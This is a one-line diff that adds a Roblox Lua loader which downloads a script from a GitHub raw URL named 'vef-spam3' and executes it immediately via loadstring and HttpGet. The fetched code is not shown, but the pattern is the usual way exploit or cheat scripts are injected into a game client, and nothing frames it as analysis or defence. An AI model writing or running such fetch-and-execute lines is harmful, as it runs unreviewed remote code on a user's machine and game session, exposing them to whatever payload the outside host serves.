@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/vef-spam3-n4z86g8ygzv9hz.lua"))()
